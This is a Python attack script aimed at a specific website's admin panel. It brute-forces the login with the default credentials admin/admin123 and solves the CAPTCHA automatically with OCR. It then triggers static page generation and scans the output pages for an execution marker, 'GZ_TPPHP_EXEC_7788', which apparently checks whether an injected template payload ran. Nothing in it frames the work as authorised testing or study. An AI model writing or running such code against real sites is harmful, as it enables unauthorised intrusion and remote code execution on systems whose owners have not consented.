#!/usr/bin/env python3
"""gz: login, staticweb generate for id=71, capture exact paths, try each"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# staticweb for id=71 (fresh session)
code, final, body = fetch(HOST + "/index.php?m=admin&c=other&a=staticweb&id=71",
                          headers={"Referer": HOST + "/index.php?m=admin&c=other&a=staticweb"})
bt = body.decode("utf-8", "ignore")
print("staticweb id=71:", code, final, bt[:600])

# extract all href paths
paths = re.findall(r'href=\\"([^\\"]+)\\"', bt)
print("paths:", paths)
for p in paths:
    p2 = p.replace("\\/", "/")
    code, final, body = fetch(HOST + "/" + p2.lstrip("/") if not p2.startswith("http") else p2,
                              headers={"Referer": HOST + "/index.php?m=admin&c=other&a=staticweb"})
    b = body.decode("utf-8", "ignore")
    print("visit %s: %s size=%d has_tpl=%s" % (p2, code, len(b), "GZ_TPPHP_EXEC_7788" in b))
